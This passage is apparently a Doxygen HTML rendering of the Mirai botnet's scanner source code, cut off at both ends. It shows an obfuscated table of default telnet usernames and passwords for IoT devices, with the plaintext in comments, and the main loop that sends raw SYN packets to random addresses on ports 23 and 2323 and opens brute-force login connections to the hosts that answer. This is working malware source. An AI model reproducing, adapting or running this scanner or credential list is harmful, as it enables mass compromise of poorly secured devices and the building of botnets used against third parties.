guest</span></div><div class="line"><a name="l00154"></a><span class="lineno">  154</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x45\x57\x47\x51\x56&quot;</span>, <span class="stringliteral">&quot;\x13\x10\x11\x16\x17&quot;</span>, 1);                      <span class="comment">// guest    12345</span></div><div class="line"><a name="l00155"></a><span class="lineno">  155</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x45\x57\x47\x51\x56&quot;</span>, <span class="stringliteral">&quot;\x13\x10\x11\x16\x17&quot;</span>, 1);                      <span class="comment">// guest    12345</span></div><div class="line"><a name="l00156"></a><span class="lineno">  156</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C\x13&quot;</span>, <span class="stringliteral">&quot;\x52\x43\x51\x51\x55\x4D\x50\x46&quot;</span>, 1);      <span class="comment">// admin1   password</span></div><div class="line"><a name="l00157"></a><span class="lineno">  157</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50&quot;</span>, <span class="stringliteral">&quot;\x13\x10\x11\x16&quot;</span>, 1); <span class="comment">// administrator 1234</span></div><div class="line"><a name="l00158"></a><span class="lineno">  158</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x14\x14\x14\x14\x14\x14&quot;</span>, <span class="stringliteral">&quot;\x14\x14\x14\x14\x14\x14&quot;</span>, 1);              <span class="comment">// 666666   666666</span></div><div class="line"><a name="l00159"></a><span class="lineno">  159</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x1A\x1A\x1A\x1A\x1A\x1A&quot;</span>, <span class="stringliteral">&quot;\x1A\x1A\x1A\x1A\x1A\x1A&quot;</span>, 1);              <span class="comment">// 888888   888888</span></div><div class="line"><a name="l00160"></a><span class="lineno">  160</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x57\x40\x4C\x56&quot;</span>, <span class="stringliteral">&quot;\x57\x40\x4C\x56&quot;</span>, 1);                              <span class="comment">// ubnt     ubnt</span></div><div class="line"><a name="l00161"></a><span class="lineno">  161</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x49\x4E\x54\x13\x10\x11\x16&quot;</span>, 1);                  <span class="comment">// root     klv1234</span></div><div class="line"><a name="l00162"></a><span class="lineno">  162</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x78\x56\x47\x17\x10\x13&quot;</span>, 1);                      <span class="comment">// root     Zte521</span></div><div class="line"><a name="l00163"></a><span class="lineno">  163</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x4A\x4B\x11\x17\x13\x1A&quot;</span>, 1);                      <span class="comment">// root     hi3518</span></div><div class="line"><a name="l00164"></a><span class="lineno">  164</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x48\x54\x40\x58\x46&quot;</span>, 1);                          <span class="comment">// root     jvbzd</span></div><div class="line"><a name="l00165"></a><span class="lineno">  165</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x43\x4C\x49\x4D&quot;</span>, 4);                              <span class="comment">// root     anko</span></div><div class="line"><a name="l00166"></a><span class="lineno">  166</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x58\x4E\x5A\x5A\x0C&quot;</span>, 1);                          <span class="comment">// root     zlxx.</span></div><div class="line"><a name="l00167"></a><span class="lineno">  167</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54&quot;</span>, 1); <span class="comment">// root     7ujMko0vizxv</span></div><div class="line"><a name="l00168"></a><span class="lineno">  168</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C&quot;</span>, 1); <span class="comment">// root     7ujMko0admin</span></div><div class="line"><a name="l00169"></a><span class="lineno">  169</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x51\x5B\x51\x56\x47\x4F&quot;</span>, 1);                      <span class="comment">// root     system</span></div><div class="line"><a name="l00170"></a><span class="lineno">  170</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x4B\x49\x55\x40&quot;</span>, 1);                              <span class="comment">// root     ikwb</span></div><div class="line"><a name="l00171"></a><span class="lineno">  171</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x46\x50\x47\x43\x4F\x40\x4D\x5A&quot;</span>, 1);              <span class="comment">// root     dreambox</span></div><div class="line"><a name="l00172"></a><span class="lineno">  172</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x57\x51\x47\x50&quot;</span>, 1);                              <span class="comment">// root     user</span></div><div class="line"><a name="l00173"></a><span class="lineno">  173</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x50\x47\x43\x4E\x56\x47\x49&quot;</span>, 1);                  <span class="comment">// root     realtek</span></div><div class="line"><a name="l00174"></a><span class="lineno">  174</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x12\x12\x12\x12\x12\x12\x12\x12&quot;</span>, 1);              <span class="comment">// root     00000000</span></div><div class="line"><a name="l00175"></a><span class="lineno">  175</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;\x13\x13\x13\x13\x13\x13\x13&quot;</span>, 1);              <span class="comment">// admin    1111111</span></div><div class="line"><a name="l00176"></a><span class="lineno">  176</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;\x13\x10\x11\x16&quot;</span>, 1);                          <span class="comment">// admin    1234</span></div><div class="line"><a name="l00177"></a><span class="lineno">  177</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;\x13\x10\x11\x16\x17&quot;</span>, 1);                      <span class="comment">// admin    12345</span></div><div class="line"><a name="l00178"></a><span class="lineno">  178</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;\x17\x16\x11\x10\x13&quot;</span>, 1);                      <span class="comment">// admin    54321</span></div><div class="line"><a name="l00179"></a><span class="lineno">  179</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;\x13\x10\x11\x16\x17\x14&quot;</span>, 1);                  <span class="comment">// admin    123456</span></div><div class="line"><a name="l00180"></a><span class="lineno">  180</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C&quot;</span>, 1); <span class="comment">// admin    7ujMko0admin</span></div><div class="line"><a name="l00181"></a><span class="lineno">  181</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;\x16\x11\x10\x13&quot;</span>, 1);                          <span class="comment">// admin    1234</span></div><div class="line"><a name="l00182"></a><span class="lineno">  182</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;\x52\x43\x51\x51&quot;</span>, 1);                          <span class="comment">// admin    pass</span></div><div class="line"><a name="l00183"></a><span class="lineno">  183</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;\x4F\x47\x4B\x4C\x51\x4F&quot;</span>, 1);                  <span class="comment">// admin    meinsm</span></div><div class="line"><a name="l00184"></a><span class="lineno">  184</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x56\x47\x41\x4A&quot;</span>, <span class="stringliteral">&quot;\x56\x47\x41\x4A&quot;</span>, 1);                              <span class="comment">// tech     tech</span></div><div class="line"><a name="l00185"></a><span class="lineno">  185</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x4F\x4D\x56\x4A\x47\x50&quot;</span>, <span class="stringliteral">&quot;\x44\x57\x41\x49\x47\x50&quot;</span>, 1);              <span class="comment">// mother   fucker</span></div><div class="line"><a name="l00186"></a><span class="lineno">  186</span>&#160;</div><div class="line"><a name="l00187"></a><span class="lineno">  187</span>&#160;</div><div class="line"><a name="l00188"></a><span class="lineno">  188</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00189"></a><span class="lineno">  189</span>&#160;    printf(<span class="stringliteral">&quot;[scanner] Scanner process initialized. Scanning started.\n&quot;</span>);</div><div class="line"><a name="l00190"></a><span class="lineno">  190</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00191"></a><span class="lineno">  191</span>&#160;</div><div class="line"><a name="l00192"></a><span class="lineno">  192</span>&#160;    <span class="comment">// Main logic loop</span></div><div class="line"><a name="l00193"></a><span class="lineno">  193</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00194"></a><span class="lineno">  194</span>&#160;    {</div><div class="line"><a name="l00195"></a><span class="lineno">  195</span>&#160;        fd_set fdset_rd, fdset_wr;</div><div class="line"><a name="l00196"></a><span class="lineno">  196</span>&#160;        <span class="keyword">struct </span><a class="code" href="structscanner__connection.html">scanner_connection</a> *conn;</div><div class="line"><a name="l00197"></a><span class="lineno">  197</span>&#160;        <span class="keyword">struct </span>timeval tim;</div><div class="line"><a name="l00198"></a><span class="lineno">  198</span>&#160;        <span class="keywordtype">int</span> last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;</div><div class="line"><a name="l00199"></a><span class="lineno">  199</span>&#160;</div><div class="line"><a name="l00200"></a><span class="lineno">  200</span>&#160;        <span class="comment">// Spew out SYN to try and get a response</span></div><div class="line"><a name="l00201"></a><span class="lineno">  201</span>&#160;        <span class="keywordflow">if</span> (fake_time != last_spew)</div><div class="line"><a name="l00202"></a><span class="lineno">  202</span>&#160;        {</div><div class="line"><a name="l00203"></a><span class="lineno">  203</span>&#160;            last_spew = fake_time;</div><div class="line"><a name="l00204"></a><span class="lineno">  204</span>&#160;</div><div class="line"><a name="l00205"></a><span class="lineno">  205</span>&#160;            <span class="keywordflow">for</span> (i = 0; i &lt; <a class="code" href="scanner_8h.html#ae5695e717c0094f9c301920bbb4215b0">SCANNER_RAW_PPS</a>; i++)</div><div class="line"><a name="l00206"></a><span class="lineno">  206</span>&#160;            {</div><div class="line"><a name="l00207"></a><span class="lineno">  207</span>&#160;                <span class="keyword">struct </span>sockaddr_in paddr = {0};</div><div class="line"><a name="l00208"></a><span class="lineno">  208</span>&#160;                <span class="keyword">struct </span>iphdr *iph = (<span class="keyword">struct </span>iphdr *)scanner_rawpkt;</div><div class="line"><a name="l00209"></a><span class="lineno">  209</span>&#160;                <span class="keyword">struct </span>tcphdr *tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00210"></a><span class="lineno">  210</span>&#160;</div><div class="line"><a name="l00211"></a><span class="lineno">  211</span>&#160;                iph-&gt;id = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00212"></a><span class="lineno">  212</span>&#160;                iph-&gt;saddr = <a class="code" href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a>;</div><div class="line"><a name="l00213"></a><span class="lineno">  213</span>&#160;                iph-&gt;daddr = <a class="code" href="scanner_8h.html#ad4ec7558569ac7b11fca77e309fe2142">get_random_ip</a>();</div><div class="line"><a name="l00214"></a><span class="lineno">  214</span>&#160;                iph-&gt;check = 0;</div><div class="line"><a name="l00215"></a><span class="lineno">  215</span>&#160;                iph-&gt;check = <a class="code" href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a>((uint16_t *)iph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00216"></a><span class="lineno">  216</span>&#160;</div><div class="line"><a name="l00217"></a><span class="lineno">  217</span>&#160;                <span class="keywordflow">if</span> (i % 10 == 0)</div><div class="line"><a name="l00218"></a><span class="lineno">  218</span>&#160;                {</div><div class="line"><a name="l00219"></a><span class="lineno">  219</span>&#160;                    tcph-&gt;dest = htons(2323);</div><div class="line"><a name="l00220"></a><span class="lineno">  220</span>&#160;                }</div><div class="line"><a name="l00221"></a><span class="lineno">  221</span>&#160;                <span class="keywordflow">else</span></div><div class="line"><a name="l00222"></a><span class="lineno">  222</span>&#160;                {</div><div class="line"><a name="l00223"></a><span class="lineno">  223</span>&#160;                    tcph-&gt;dest = htons(23);</div><div class="line"><a name="l00224"></a><span class="lineno">  224</span>&#160;                }</div><div class="line"><a name="l00225"></a><span class="lineno">  225</span>&#160;                tcph-&gt;seq = iph-&gt;daddr;</div><div class="line"><a name="l00226"></a><span class="lineno">  226</span>&#160;                tcph-&gt;check = 0;</div><div class="line"><a name="l00227"></a><span class="lineno">  227</span>&#160;                tcph-&gt;check = <a class="code" href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a>(iph, tcph, htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr)), <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr));</div><div class="line"><a name="l00228"></a><span class="lineno">  228</span>&#160;</div><div class="line"><a name="l00229"></a><span class="lineno">  229</span>&#160;                paddr.sin_family = AF_INET;</div><div class="line"><a name="l00230"></a><span class="lineno">  230</span>&#160;                paddr.sin_addr.s_addr = iph-&gt;daddr;</div><div class="line"><a name="l00231"></a><span class="lineno">  231</span>&#160;                paddr.sin_port = tcph-&gt;dest;</div><div class="line"><a name="l00232"></a><span class="lineno">  232</span>&#160;</div><div class="line"><a name="l00233"></a><span class="lineno">  233</span>&#160;                sendto(rsck, scanner_rawpkt, <span class="keyword">sizeof</span> (scanner_rawpkt), MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;paddr, <span class="keyword">sizeof</span> (paddr));</div><div class="line"><a name="l00234"></a><span class="lineno">  234</span>&#160;            }</div><div class="line"><a name="l00235"></a><span class="lineno">  235</span>&#160;        }</div><div class="line"><a name="l00236"></a><span class="lineno">  236</span>&#160;</div><div class="line"><a name="l00237"></a><span class="lineno">  237</span>&#160;        <span class="comment">// Read packets from raw socket to get SYN+ACKs</span></div><div class="line"><a name="l00238"></a><span class="lineno">  238</span>&#160;        last_avail_conn = 0;</div><div class="line"><a name="l00239"></a><span class="lineno">  239</span>&#160;        <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00240"></a><span class="lineno">  240</span>&#160;        {</div><div class="line"><a name="l00241"></a><span class="lineno">  241</span>&#160;            <span class="keywordtype">int</span> n;</div><div class="line"><a name="l00242"></a><span class="lineno">  242</span>&#160;            <span class="keywordtype">char</span> dgram[1514];</div><div class="line"><a name="l00243"></a><span class="lineno">  243</span>&#160;            <span class="keyword">struct </span>iphdr *iph = (<span class="keyword">struct </span>iphdr *)dgram;</div><div class="line"><a name="l00244"></a><span class="lineno">  244</span>&#160;            <span class="keyword">struct </span>tcphdr *tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00245"></a><span class="lineno">  245</span>&#160;            <span class="keyword">struct </span><a class="code" href="structscanner__connection.html">scanner_connection</a> *conn;</div><div class="line"><a name="l00246"></a><span class="lineno">  246</span>&#160;</div><div class="line"><a name="l00247"></a><span class="lineno">  247</span>&#160;            errno = 0;</div><div class="line"><a name="l00248"></a><span class="lineno">  248</span>&#160;            n = recvfrom(rsck, dgram, <span class="keyword">sizeof</span> (dgram), MSG_NOSIGNAL, NULL, NULL);</div><div class="line"><a name="l00249"></a><span class="lineno">  249</span>&#160;            <span class="keywordflow">if</span> (n &lt;= 0 || errno == EAGAIN || errno == EWOULDBLOCK)</div><div class="line"><a name="l00250"></a><span class="lineno">  250</span>&#160;                <span class="keywordflow">break</span>;</div><div class="line"><a name="l00251"></a><span class="lineno">  251</span>&#160;</div><div class="line"><a name="l00252"></a><span class="lineno">  252</span>&#160;            <span class="keywordflow">if</span> (n &lt; <span class="keyword">sizeof</span>(<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tcphdr))</div><div class="line"><a name="l00253"></a><span class="lineno">  253</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00254"></a><span class="lineno">  254</span>&#160;            <span class="keywordflow">if</span> (iph-&gt;daddr != <a class="code" href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a>)</div><div class="line"><a name="l00255"></a><span class="lineno">  255</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00256"></a><span class="lineno">  256</span>&#160;            <span class="keywordflow">if</span> (iph-&gt;protocol != IPPROTO_TCP)</div><div class="line"><a name="l00257"></a><span class="lineno">  257</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00258"></a><span class="lineno">  258</span>&#160;            <span class="keywordflow">if</span> (tcph-&gt;source != htons(23) &amp;&amp; tcph-&gt;source != htons(2323))</div><div class="line"><a name="l00259"></a><span class="lineno">  259</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00260"></a><span class="lineno">  260</span>&#160;            <span class="keywordflow">if</span> (tcph-&gt;dest != source_port)</div><div class="line"><a name="l00261"></a><span class="lineno">  261</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00262"></a><span class="lineno">  262</span>&#160;            <span class="keywordflow">if</span> (!tcph-&gt;syn)</div><div class="line"><a name="l00263"></a><span class="lineno">  263</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00264"></a><span class="lineno">  264</span>&#160;            <span class="keywordflow">if</span> (!tcph-&gt;ack)</div><div class="line"><a name="l00265"></a><span class="lineno">  265</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00266"></a><span class="lineno">  266</span>&#160;            <span class="keywordflow">if</span> (tcph-&gt;rst)</div><div class="line"><a name="l00267"></a><span class="lineno">  267</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00268"></a><span class="lineno">  268</span>&#160;            <span class="keywordflow">if</span> (tcph-&gt;fin)</div><div class="line"><a name="l00269"></a><span class="lineno">  269</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00270"></a><span class="lineno">  270</span>&#160;            <span class="keywordflow">if</span> (htonl(ntohl(tcph-&gt;ack_seq) - 1) != iph-&gt;saddr)</div><div class="line"><a name="l00271"></a><span class="lineno">  271</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00272"></a><span class="lineno">  272</span>&#160;</div><div class="line"><a name="l00273"></a><span class="lineno">  273</span>&#160;            conn = NULL;</div><div class="line"><a name="l00274"></a><span class="lineno">  274</span>&#160;            <span class="keywordflow">for</span> (n = last_avail_conn; n &lt; <a class="code" href="scanner_8h.html#a1a530c3cd75361d34847e8c60a95312a">SCANNER_MAX_CONNS</a>; n++)</div><div class="line"><a name="l00275"></a><span class="lineno">  275</span>&#160;            {</div><div class="line"><a name="l00276"></a><span class="lineno">  276</span>&#160;                <span class="keywordflow">if</span> (conn_table[n].<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> == <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfadf24afb192442661937cd364b68d76c6">SC_CLOSED</a>)</div><div class="line"><a name="l00277"></a><span class="lineno">  277</span>&#160;                {</div><div class="line"><a name="l00278"></a><span class="lineno">  278</span>&#160;                    conn = &amp;conn_table[n];</div><div class="line"><a name="l00279"></a><span class="lineno">  279</span>&#160;                    last_avail_conn = n;</div><div class="line"><a name="l00280"></a><span class="lineno">  280</span>&#160;                    <span class="keywordflow">break</span>;</div><div class="line"><a name="l00281"></a><span class="lineno">  281</span>&#160;                }</div><div class="line"><a name="l00282"></a><span class="lineno">  282</span>&#160;            }</div><div class="line"><a name="l00283"></a><span class="lineno">  283</span>&#160;</div><div class="line"><a name="l00284"></a><span class="lineno">  284</span>&#160;            <span class="comment">// If there were no slots, then no point reading any more</span></div><div class="line"><a name="l00285"></a><span class="lineno">  285</span>&#160;            <span class="keywordflow">if</span> (conn == NULL)</div><div class="line"><a name="l00286"></a><span class="lineno">  286</span>&#160;                <span class="keywordflow">break</span>;</div><div class="line"><a name="l00287"></a><span class="lineno">  287</span>&#160;</div><div class="line"><a name="l00288"></a><span class="lineno">  288</span>&#160;            conn-&gt;<a class="code" href="structscanner__connection.html#aaa8150f776cb2b9c66932501a5d1c5e8">dst_addr</a> = iph-&gt;saddr;</div><div class="line"><a name="l00289"></a><span class="lineno">  289</span>&#160;            conn-&gt;<a class="code" href="structscanner__connection.html#a3c7eb1f8350e4fe3474722cd78a77040">dst_port</a> = tcph-&gt;source;</div><div class="line"><a name="l00290"></a><span class="lineno">  290</span>&#160;            <a class="code" href="scanner_8h.html#ab4d05f6f50d6ff26552bfcc373527659">setup_connection</a>(conn);</div><div class="line"><a name="l00291"></a><span class="lineno">  291</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00292"></a><span class="lineno">  292</span>&#160;            printf(<span class="stringliteral">&quot;[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, iph-&gt;saddr &amp; 0xff, (iph-&gt;saddr &gt;&gt; 8) &amp; 0xff, (iph-&gt;saddr &gt;&gt; 16) &amp; 0xff, (iph-&gt;saddr &gt;&gt; 24) &amp; 0xff);</div><div class="line"><a name="l00293"></a><span class="lineno">  293</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00294"></a><span class="lineno">  294</span>&#160;        }</div><div class="line"><a name="l00295"></a><span class="lineno">  295</span>&#160;</div><div class="line"><a name="l00296"></a><span class="lineno">  296</span>&#160;        <span class="comment">// Load file descriptors into fdsets</span></div><div class="line"><a name="l00297"></a><span class="lineno">  297</span>&#160;        FD_ZERO(&amp;fdset_rd);</div><div class="line"><a name="l00298"></a><span class="lineno">  298</span>&#160;        FD_ZERO(&amp;fdset_wr);</div><div class="line"><a name="l00299"></a><span class="lineno">  299</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; <a class="code" href="scanner_8h.html#a1a530c3cd75361d34847e8c60a95312a">SCANNER_MAX_CONNS</a>; i++)</div><div class="line"><a name="l00300"></a><span class="lineno">  300</span>&#160;        {</div><div class="line"><a name="l00301"></a><span class="lineno">  301</span>&#160;            <span class="keywordtype">int</span> timeout;</div><div class="line"><a name="l00302"></a><span class="lineno">  302</span>&#160;</div><div class="line"><a name="l00303"></a><span class="lineno">  303</span>&#160;            conn = &amp;conn_table[i];</div><div class="line"><a name="l00304"></a><span class="lineno">  304</span>&#160;            timeout = (conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> &gt; <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa00fef5111c635b0656496fc72b109909">SC_CONNECTING</a> ? 30 : 5);</div><div class="line"><a name="l00305"></a><span class="lineno">  305</span>&#160;</div><div class="line"><a name="l00306"></a><span class="lineno">  306</span>&#160;            <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> != <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfadf24afb192442661937cd364b68d76c6">SC_CLOSED</a> &amp;&amp; (fake_time - conn-&gt;<a class="code" href="structscanner__connection.html#a404ba23e26531c9e469151220f2b8c5b">last_recv</a>) &gt; timeout)</div><div class="line"><a name="l00307"></a><span class="lineno">  307</span>&#160;            {</div><div class="line"><a name="l00308"></a><span class="lineno">  308</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00309"></a><span class="lineno">  309</span>&#160;                printf(<span class="stringliteral">&quot;[scanner] FD%d timed out (state = %d)\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a>);</div><div class="line"><a name="l00310"></a><span class="lineno">  310</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00311"></a><span class="lineno">  311</span>&#160;                <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00312"></a><span class="lineno">  312</span>&#160;                conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a> = -1;</div><div class="line"><a name="l00313"></a><span class="lineno">  313</span>&#160;</div><div class="line"><a name="l00314"></a><span class="lineno">  314</span>&#160;                <span class="comment">// Retry</span></div><div class="line"><a name="l00315"></a><span class="lineno">  315</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> &gt; <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa3249bd9668855185501733f9bef09acf">SC_HANDLE_IACS</a>) <span class="comment">// If we were at least able to connect, try again</span></div><div class="line"><a name="l00316"></a><span class="lineno">  316</span>&#160;                {</div><div class="line"><a name="l00317"></a><span class="lineno">  317</span>&#160;                    <span class="keywordflow">if</span> (++(conn-&gt;<a class="code" 